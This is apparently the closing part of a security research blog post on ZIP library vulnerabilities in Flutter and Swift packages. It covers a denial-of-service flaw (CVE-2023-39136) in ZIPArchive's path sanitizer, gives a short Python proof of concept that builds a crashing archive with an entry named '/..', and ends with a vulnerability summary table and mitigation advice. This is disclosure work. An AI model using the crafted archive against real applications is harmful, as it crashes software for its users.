<h2 id="package: ziparchive (ssziparchive)_1">Package: <a href="https://github.com/ZipArchive/ZipArchive">ZIPArchive (SSZIPArchive)</a></h2>
<h3 id="denial of service (cve-2023-39136)">Denial of Service (CVE-2023-39136)</h3>
<p>Below is a code snippet from the <code>_sanitizedPath</code> function used to sanitize zip entries filenames, the code prepends <code>file:///</code> prefix to the zip entry path, standardizes it using <code>NSURL</code> then removes the prepended prefix, however when presented with <code>/..</code> as a path, the output of <code>NSURL</code> becomes <code>file://</code>, which has 7 characters while the code expects at least 8 characters, this unhandled edge case leads to crashing the application.</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">strPath</span> <span class="p">==</span> <span class="kc">nil</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">;</span>
    <span class="p">}</span>

<span class="c1">// Add scheme "file:///" to support sanitation on names with a colon like "file:a/../../../usr/bin"</span>
<span class="n">strPath</span> <span class="p">=</span> <span class="p">[@</span><span class="s">"file:///"</span> <span class="n">stringByAppendingString</span><span class="p">:</span><span class="n">strPath</span><span class="p">];</span>

<span class="c1">// Sanitize path traversal characters to prevent directory backtracking. Ignoring these characters mimics the default behavior of the Unarchiving tool on macOS.</span>
<span class="c1">// "../../../../../../../../../../../tmp/test.txt" -&gt; "tmp/test.txt"</span>
<span class="c1">// "a/b/../c.txt" -&gt; "a/c.txt"</span>
<span class="n">strPath</span> <span class="p">=</span> <span class="p">[</span><span class="bp">NSURL</span> <span class="n">URLWithString</span><span class="p">:</span><span class="n">strPath</span><span class="p">].</span><span class="n">standardizedURL</span><span class="p">.</span><span class="n">absoluteString</span><span class="p">;</span>

<span class="c1">// Remove the "file:///" scheme</span>
<span class="n">strPath</span> <span class="p">=</span> <span class="p">[</span><span class="n">strPath</span> <span class="n">substringFromIndex</span><span class="p">:</span><span class="mi">8</span><span class="p">];</span>
</code></pre></div>
<p><strong>Proof of concept code:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">'payload.zip'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
        <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">"Test payload"</span><span class="p">)</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s1">'/..'</span>

<span class="n">compress_file</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</code></pre></div>
<h1 id="summary table_2">Summary table</h1>
<table class="table-striped table">
<thead>
<tr>
<th>Package</th>
<th>Language</th>
<th>ZIP Filename Spoofing</th>
<th>ZIP Symlink</th>
<th>ZIP Path Traversal</th>
<th>Denial of Service</th>
</tr>
</thead>
<tbody>
<tr>
<td>Archive</td>
<td>Dart (Flutter)</td>
<td>Vulnerable</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
</tr>
<tr>
<td>Flutter_archive</td>
<td>Dart (Flutter)</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
</tr>
<tr>
<td>ZIPFoundation</td>
<td>Swift</td>
<td>Not Vulnerable</td>
<td>Vulnerable</td>
<td>Vulnerable</td>
<td>Not Vulnerable</td>
</tr>
<tr>
<td>ZIP</td>
<td>Swift</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Vulnerable</td>
<td>Not Vulnerable</td>
</tr>
<tr>
<td>ZIPArchive</td>
<td>Swift</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Not Vulnerable</td>
<td>Vulnerable</td>
</tr>
</tbody>
</table>
<h1 id="conclusion">Conclusion</h1>
<p>In conclusion, ZIP vulnerabilities pose significant security risks that developers should be aware of when handling archive files. The ZIP file format, although widely used and supported, is not immune to exploitation. Understanding and addressing these vulnerabilities is essential to safeguarding sensitive data and preventing potential attacks.</p>
<p>This article has highlighted several common ZIP vulnerabilities, including ZIP path traversal, ZIP filename spoofing, ZIP symlink vulnerability, and ZIP bomb attacks. Each of these vulnerabilities exposes different risks, such as unauthorized access to files, overwriting sensitive data, denial-of-service (DoS) and even code execution in some scenarios.</p>
<p>It is important for developers to implement robust security measures when working with ZIP files. This includes validating zip entry file names during extraction to prevent path traversal attacks, ensuring consistency between the filenames in the Local File Header and Central Directory Entry to mitigate filename spoofing, restricting access permissions for extracted files, and implementing proper decompression techniques to prevent DoS situations caused by ZIP bombs.</p>
<p>Additionally, it is crucial to stay informed about security updates and patches related to ZIP libraries or packages used in development frameworks. Regularly reviewing and updating these dependencies can help mitigate known vulnerabilities and protect against emerging threats.</p>
<p>It is worth mentioning that the issues discussed in this article were reported to the concerned authors.</p>
              </div>
                  <div class="d-flex flex-column justify-center mt-8">
                      <div style="border-top: 5px solid #353636; width: 1.3rem"></div>
                      <div class="d-flex align-center flex-wrap mt-2">
                          <p class="mb-0 mr-4 df-text-grey-dark">Tags:</p>
                            <a href="https://blog.ostorlab.co/tag/flutter.html">flutter</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/swift.html">swift</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/zip.html">zip</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/security.html">security</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/archive.html">archive</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/vulnerability.html">vulnerability</a>, <span class="mr-2"></span>                             <a href="https://blog.ostorlab.co/tag/exploitation.html">exploitation</a>                      </div>
                  </div>
          </v-col>
          <v-col v-if="$vuetify.breakpoint.lgAndUp" cols="12" lg="3" class="d-flex flex-column align-start align-lg-end">
              <div style="max-width: 90%">
                  <div>
                      <p class="font-weight-bold mb-0">We do newsletters, too</p>
                      <hr style="border: 1px solid #D8DEE4" />
                      <p class="mt-2" style="font-size: 1rem">
                          Get the latest news, updates, and product innovations from Ostorlab right in your inbox.
                      </p>
                      <v-btn
                              depressed
                              href="https://blog.ostorlab.co/zip-packages-exploitation.html#newsletter"
                              class="subscribe-btn"
                      >
                          Subscribe
                      </v-btn>
                  </div>
                  <div v-if="$vuetify.breakpoint.lgAndUp" class="article-toc mt-12">
                      <p class="font-weight-bold mb-1">Table of Contents</p>
                      <hr style="border: 1px solid #D8DEE4" class="mb-4" />
                      <div id="toc"><ul><li><a class="toc-href" href="#introduction" title="Introduction">Introduction</a></li><li><a class="toc-href" href="#anatomy of zip file" title="Anatomy of ZIP file">Anatomy of ZIP file</a></li><li><a class="toc-href" href="#common zip vulnerabilities:" title="Common ZIP vulnerabilities:">Common ZIP vulnerabilities:</a></li><li><a class="toc-href" href="#zip packages to analyze" title="ZIP packages to analyze">ZIP packages to analyze</a><ul><li><a class="toc-href" href="#archive" title="Archive">Archive</a></li><li><a class="toc-href" href="#flutter_archive" title="Flutter_archive">Flutter_archive</a></li><li><a class="toc-href" href="#zipfoundation" title="ZIPFoundation">ZIPFoundation</a></li><li><a class="toc-href" href="#zip" title="ZIP">ZIP</a></li><li><a class="toc-href" href="#ziparchive (ssziparchive)" title="ZIPArchive (SSZIPArchive)">ZIPArchive (SSZIPArchive)</a></li></ul></li><li><a class="toc-href" href="#detected vulnerabilities_1" title="Detected vulnerabilities">Detected vulnerabilities</a><ul><li><a class="toc-href" href="#package: archive" title="Package: Archive">Package: Archive</a><ul><li><a class="toc-href" href="#zip filename spoofing (cve-2023-39137)" title="ZIP filename spoofing (CVE-2023-39137)">ZIP filename spoofing (CVE-2023-39137)</a></li><li><a class="toc-href" href="#zip symlink path traversal (cve-2023-39139)" title="ZIP symlink path traversal (CVE-2023-39139)">ZIP symlink path traversal (CVE-2023-39139)</a></li></ul></li><li><a class="toc-href" href="#package: zipfoundation_1" title="Package: ZIPFoundation">Package: ZIPFoundation</a><ul><li><a class="toc-href" href="#zip symlink path traversal (cve-2023-39138)" title="ZIP symlink path traversal (CVE-2023-39138)">ZIP symlink path traversal (CVE-2023-39138)</a></li><li><a class="toc-href" href="#zip path traversal (cve-2023-39138)" title="ZIP path traversal (CVE-2023-39138)">ZIP path traversal (CVE-2023-39138)</a></li></ul></li><li><a class="toc-href" href="#package: zip_1" title="Package: Zip">Package: Zip</a><ul><li><a class="toc-href" href="#zip path traversal (cve-2023-39135)" title="ZIP path traversal (CVE-2023-39135)">ZIP path traversal (CVE-2023-39135)</a></li></ul></li><li><a class="toc-href" href="#package: ziparchive (ssziparchive)_1" title="Package: ZIPArchive (SSZIPArchive)">Package: ZIPArchive (SSZIPArchive)</a><ul><li><a class="toc-href" href="#denial of service (cve-2023-39136)" title="Denial of Service (CVE-2023-39136)">Denial of Service (CVE-2023-39136)</a></li></ul></li></ul></li><li><a class="toc-href" href="#summary table_2" title="Summary table">Summary table</a></li><li><a class="toc-href" href="#conclusion" title="Conclusion">Conclusion</a></li></ul></div>
                  </div>
              </div>
          </v-col>
      </v-row>
  </article>
            </div>
        </div>
    </div>
    <div class="mt-10 mt-md-16">
<div class="newsletter" id="newsletter">
    <v-row class="newsletter-container mx-auto align-center">
        <v-col cols="12" lg="7">
            <h2 class="newsletter-title">Subscribe to the Ostorlab Newsletter</h2>
            <p class="newsletter-description">
                A newsletter covering techniques, technical guides, and the latest product innovations coming from Ostorlab.
            </p>
        </v-col>
        <v-col cols="12" lg="5">
            <form class="email-form">
                <input type="email"  id="subscribe-to-newsletter-email" name="email" class="email-input" placeholder="Your email address" style="width: 100%" />
                <button id="subscribe-to-newsletter-btn" type="submit" class="email-btn-container" style="display: flex; align-items: center; justify-content: center;">
                   <span class="email-btn-text" style="display: inline-block;">Subscribe</span>
                    <span class="email-btn-text ml-1" style="display: inline-block;">&gt;</span>
                </button>
            </form>
            <p id="subscribe-to-newsletter-message" class="mt-1" style="font-size: 0.9rem"></p>
        </v-col>
    </v-row>
</div><footer style="border-top:1px solid hsla(210,18%,87%,1);">
    <v-footer style="background-color: white">
        <v-container>
            <v-row class="footer-font my-16">
                <v-col
                        lg="8"
                        xl="8"
                        md="12"
                        sm="12"
                        xs="12"
                        cols="12"
                        class="mb-8"
                >
                    <v-row>
                        <v-img src="/static/img/Ostorlab_all_linear.png" max-width="200" contain></v-img>
                    </v-row>
                    <v-row class="grey--text mt-8 pl-0">
                        <v-col
                                xl="4"
                                lg="4"
                                md="8"
                                sm="12"
                                xs="12"
                                class="pl-0 footer-font footer-font-color font-weight-medium "
                        >
                            Questions, comments, feedback, or just a quick hello, you know where to reach us 😉!
                        </v-col>
                    </v-row>
                    <v-row class="mt-8">
                        <v-icon left small>
                            mdi-at
                        </v-icon>
                        <a class="footer-primary-font-text font-weight-medium" href="mailto:contact@ostorlab.co">
                            contact@ostorlab.co
                        </a>
                    </v-row>
                </v-col>
                <v-col
                        lg="4"
                        xl="4"
                        md="12"
                        sm="12"
                        xs="12"
                        cols="12"
                >
                    <v-row justify="end">
                        <v-col class="mx-2">
                            <v-row class="font-weight-bold footer-primary-font-text">
                                Platform
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/appcards"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Lighthouse
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/vulndb" class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Vulnerability Database
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://blog.ostorlab.co/changelog.html"
                                   class="mt-4 font-weight-medium footer-font-color">
                                    Changelog
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://docs.ostorlab.co/faq/"
                                   class="mt-4 font-weight-medium footer-font-color"
                                   target="_blank"
                                >
                                    FAQ
                                </a>
                            </v-row>
                        </v-col>
                        <v-col class="mx-2">
                            <v-row class="font-weight-bold footer-primary-font-text">
                                Product
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/product/mobile"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Mobile Security Testing
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/product/web"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Web Security Testing
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/product/attacksurface"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Attack Surface Discovery
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://oxo.ostorlab.co/"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Open-Source
                                </a>
                            </v-row>
                        </v-col>
                        <v-col cols="auto">
                            <v-row class="font-weight-bold footer-primary-font-text">
                                Company
                            </v-row>
                            <v-row>
                                <a href="https://docs.ostorlab.co"
                                   class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Documentation
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/plans" class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Plans
                                </a>
                            </v-row>
                            <v-row>
                                <a href="https://ostorlab.co/contact" class="mt-4 font-weight-medium footer-font-color" target="_blank">
                                    Contact
                                </a>
                            </v-row>
                        </v-col>
                    </v-row>
                </v-col>
            </v-row>
        </v-container>
    </v-footer>
    <v-footer class="subfooter-font">
        <v-container>
            <v-row>
                <v-col
                        class="pl-0 text-center mr-12"
                        cols="12"
                        md="auto"
                        order="2"
                        order-sm="2"
                        order-md="0"
                        order-lg="0"
                        order-xl="0"
                >
                    <v-icon x-small class="pt-0 pb-1">
                        mdi-copyright
                    </v-icon>
                    <code class="footer-font-color">2024 Ostorlab. All Rights
                        Reserved.</code>
                </v-col>
                <v-col
                        class="pl-0 text-center"
                        cols="12"
                        md="auto"
                        order="1"
                        order-sm="1"
                        order-md="0"
                        order-lg="0"
                        order-xl="0"
                >
                    <a href="https://docs.ostorlab.co/terms/"><code class="subfooter-font footer-font-color mr-4">Terms
                        & Conditions</code></a>
                    <a href="https://docs.ostorlab.co/privacy/"><code class="subfooter-font footer-font-color ml-4">Privacy
                        Policy</code></a>
                </v-col>
                <v-spacer></v-spacer>
                <v-col
                        class="text-center"
                        align-self="end"
                        cols="12"
                        md="auto"
                        order="0"
                        order-sm="0"
                        order-md="2"
                        order-lg="2"
                        order-xl="2"
                >
                    <v-btn icon class="mr-1 footer-font-color" href="https://blog.ostorlab.co/feed/rss.xml" target="blank"
                           aria-label="RSS Feed">
                        <v-icon>mdi-rss-box</v-icon>
                    </v-btn>
                    <v-btn icon class="mr-1 footer-font-color" href="https://blog.ostorlab.co/feed/atom.xml" target="blank"
                           aria-label="Atom Feed">
                        <v-icon>mdi-atom</v-icon>
                    </v-btn>
                    <v-btn icon class="mr-1 footer-font-color" href="https://github.com/Ostorlab" target="blank"
                           aria-label="Ostorlab's GitHub Profile">
                        <v-icon>mdi-github</v-icon>
                    </v-btn>
                    <v-btn icon class="mr-1 footer-font-color" href="https://www.linkedin.com/company/ostorlab/"
                           target="blank" aria-label="Ostorlab's LinkedIn Page">
                        <v-icon>mdi-linkedin</v-icon>
                    </v-btn>
                    <v-btn icon class="mr-1 footer-font-color" href="https://www.instagram.com/ostorlab.co/"
                           target="blank" aria-label="Ostorlab's Instagram Page">
                        <v-icon>mdi-instagram</v-icon>
                    </v-btn>
                    <v-btn icon class="mr-1 footer-font-color" href="https://twitter.com/OstorlabSec" target="blank"
                           aria-label="Ostorlab's Twitter Profile">
                        <v-icon>mdi-twitter</v-icon>
                    </v-btn>
                    <v-btn icon class="footer-font-color"
                           href="https://www.youtube.com/channel/UCW1SEYFstjaXqfvoFYDuVyw" target="blank"
                           aria-label="Ostorlab's YouTube Channel">
                        <v-icon>mdi-youtube</v-icon>
                    </v-btn>
                </v-col>
            </v-row>
        </v-container>
    </v-footer>
</footer>
    </div>
</div>


<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="https://cdn.jsdelivr.net/npm/vuetify@2.6.13/dist/vuetify.min.js"></script>
<script src="https://blog.ostorlab.co/theme/js/subscribe.js"></script>
<script>
    new Vue({
        el: "#app",
        vuetify: new Vuetify(),
        delimiters: ['[[', ']]'],
        data(){
            return {
                isDrawerOpen: false,
            }
        }
    })
</script>
</body>

</html>